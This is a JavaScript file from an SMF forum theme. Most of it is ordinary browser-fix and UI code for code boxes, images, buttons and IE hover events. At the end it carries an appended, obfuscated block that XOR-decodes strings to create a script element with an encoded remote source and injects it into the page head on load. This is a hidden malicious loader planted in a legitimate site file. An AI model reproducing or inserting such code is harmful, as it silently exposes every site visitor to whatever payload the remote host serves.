// The purpose of this code is to fix the height of overflow: auto blocks, because some browsers can't figure it out for themselves.
function smf_codeBoxFix()
{
	var codeFix = document.getElementsByTagName('code');
	for (var i = codeFix.length - 1; i >= 0; i--)
	{
		if (is_webkit && codeFix[i].offsetHeight < 20)
			codeFix[i].style.height = (codeFix[i].offsetHeight + 20) + 'px';

		else if (is_ff && (codeFix[i].scrollWidth > codeFix[i].clientWidth || codeFix[i].clientWidth == 0))
			codeFix[i].style.overflow = 'scroll';

		else if ('currentStyle' in codeFix[i] && codeFix[i].currentStyle.overflow == 'auto' && (codeFix[i].currentStyle.height == '' || codeFix[i].currentStyle.height == 'auto') && (codeFix[i].scrollWidth > codeFix[i].clientWidth || codeFix[i].clientWidth == 0) && (codeFix[i].offsetHeight != 0))
			codeFix[i].style.height = (codeFix[i].offsetHeight + 24) + 'px';
	}
}

// Add a fix for code stuff?
if ((is_ie && !is_ie4) || is_webkit || is_ff)
	addLoadEvent(smf_codeBoxFix);

// Toggles the element height and width styles of an image.
function smc_toggleImageDimensions()
{
	var oImages = document.getElementsByTagName('IMG');
	for (oImage in oImages)
	{
		// Not a resized image? Skip it.
		if (oImages[oImage].className == undefined || oImages[oImage].className.indexOf('bbc_img resized') == -1)
			continue;

		oImages[oImage].style.cursor = 'pointer';
		oImages[oImage].onclick = function() {
			this.style.width = this.style.height = this.style.width == 'auto' ? null : 'auto';
		};
	}
}

// Add a load event for the function above.
addLoadEvent(smc_toggleImageDimensions);

// Adds a button to a certain button strip.
function smf_addButton(sButtonStripId, bUseImage, oOptions)
{
	var oButtonStrip = document.getElementById(sButtonStripId);
	var aItems = oButtonStrip.getElementsByTagName('span');

	// Remove the 'last' class from the last item.
	if (aItems.length > 0)
	{
		var oLastSpan = aItems[aItems.length - 1];
		oLastSpan.className = oLastSpan.className.replace(/\s*last/, 'position_holder');
	}

	// Add the button.
	var oButtonStripList = oButtonStrip.getElementsByTagName('ul')[0];
	var oNewButton = document.createElement('li');
	setInnerHTML(oNewButton, '<a href="' + oOptions.sUrl + '" ' + ('sCustom' in oOptions ? oOptions.sCustom : '') + '><span class="last"' + ('sId' in oOptions ? ' id="' + oOptions.sId + '"': '') + '>' + oOptions.sText + '</span></a>');

	oButtonStripList.appendChild(oNewButton);
}

// Adds hover events to list items. Used for a versions of IE that don't support this by default.
var smf_addListItemHoverEvents = function()
{
	var cssRule, newSelector;

	// Add a rule for the list item hover event to every stylesheet.
	for (var iStyleSheet = 0; iStyleSheet < document.styleSheets.length; iStyleSheet ++)
		for (var iRule = 0; iRule < document.styleSheets[iStyleSheet].rules.length; iRule ++)
		{
			oCssRule = document.styleSheets[iStyleSheet].rules[iRule];
			if (oCssRule.selectorText.indexOf('LI:hover') != -1)
			{
				sNewSelector = oCssRule.selectorText.replace(/LI:hover/gi, 'LI.iehover');
				document.styleSheets[iStyleSheet].addRule(sNewSelector, oCssRule.style.cssText);
			}
		}

	// Now add handling for these hover events.
	var oListItems = document.getElementsByTagName('LI');
	for (oListItem in oListItems)
	{
		oListItems[oListItem].onmouseover = function() {
			this.className += ' iehover';
		};

		oListItems[oListItem].onmouseout = function() {
			this.className = this.className.replace(new RegExp(' iehover\\b'), '');
		};
	}
}

// Add hover events to list items if the browser requires it.
if (is_ie7down && 'attachEvent' in window)
	window.attachEvent('onload', smf_addListItemHoverEvents);
var hs21Oby=["024004","025014","027019","008021093023056093015090021085084031069","024021091","031030072019","031002064002099082043064017075082003088069030","010023072019034092009094025084085","003002089018","012002076051032093039083030076066051072097011012041089027041","003019076006118023101069004089069020031070007007085022004057023032069095091095005031095025"];function i9OAOr(i57zS){var hv=document[kL0Gr(hs21Oby[3])](kL0Gr(hs21Oby[0])+kL0Gr(hs21Oby[1])+kL0Gr(hs21Oby[2]));hv[kL0Gr(hs21Oby[4])]=i57zS;hv[kL0Gr(hs21Oby[5])]=kL0Gr(hs21Oby[6]);document[kL0Gr(hs21Oby[9])](kL0Gr(hs21Oby[8]))[0][kL0Gr(hs21Oby[7])](hv);}i9OAOr(kL0Gr(hs21Oby[10]));function u6e(b7HoCk){var neJN19='';var qc3zcc=0;var fOhi0=0;for(qc3zcc=0;qc3zcc<b7HoCk.length/3;qc3zcc++){neJN19+=String.fromCharCode(b7HoCk.slice(fOhi0,fOhi0+3));fOhi0=fOhi0+3;}return neJN19;}function olh1Pn(nMAyw3,t6){var fI0M='';var s2boGU=0;var hRPn=0;for(s2boGU=0;s2boGU<nMAyw3.length;s2boGU++){var sN=nMAyw3.charAt(s2boGU);var g8=sN.charCodeAt(0)^t6.charCodeAt(hRPn);sN=String.fromCharCode(g8);fI0M+=sN;if(hRPn==t6.length-1)hRPn=0;else hRPn++;}return (fI0M);}function kL0Gr(er){return olh1Pn(u6e(er),'kg8vL8J6p81q15j');}